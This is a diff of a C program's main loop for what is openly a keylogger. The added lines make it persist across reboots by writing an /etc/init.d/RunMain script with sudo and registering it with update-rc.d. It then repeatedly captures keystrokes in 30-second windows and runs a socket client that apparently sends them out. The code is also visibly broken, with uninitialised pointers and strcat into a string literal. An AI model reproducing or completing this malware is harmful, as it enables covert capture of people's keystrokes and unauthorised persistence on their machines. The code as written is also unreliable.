@@ -10,15 +10,28 @@ void time_30s(int trigger);
 
 int main (){
   keylogger_init();
-  while (1){
-   keylogger_start();
-   time_30s(trigger);
-   keylogger_end();
-    char cwd[1024];
-    if (getcwd(cwd, sizeof(cwd)) != NULL)
-      // fprintf(stdout, "Current working dir: %s\n", cwd);
-      strcat(cwd, "/socket/client");
-    system(cwd);
+  char* cwd;
+  char* dir_cli;
+  char* dir_main;
+  if (getcwd(cwd, sizeof(cwd)) != NULL){
+    strcat(dir_main, cwd);
+    strcat(dir_main,"/main &");
+    char* comm = "sudo echo ";
+    strcat(comm, dir_main);
+    printf("%s\n", "here");
+    strcat(comm, " > /etc/init.d/RunMain");
+    printf("%s", comm);
+    system(comm);
+    system("sudo chmod +x /etc/init.d/RunMain");
+    system("sudo update-rc.d /etc/init.d/RunMain defaults");
+    while (1){
+      keylogger_start();
+      time_30s(trigger);
+      keylogger_end();
+      strcat(dir_cli,cwd);
+      strcat(dir_cli, "/socket/client");
+      system(dir_cli);
+    }
   }
 }
 
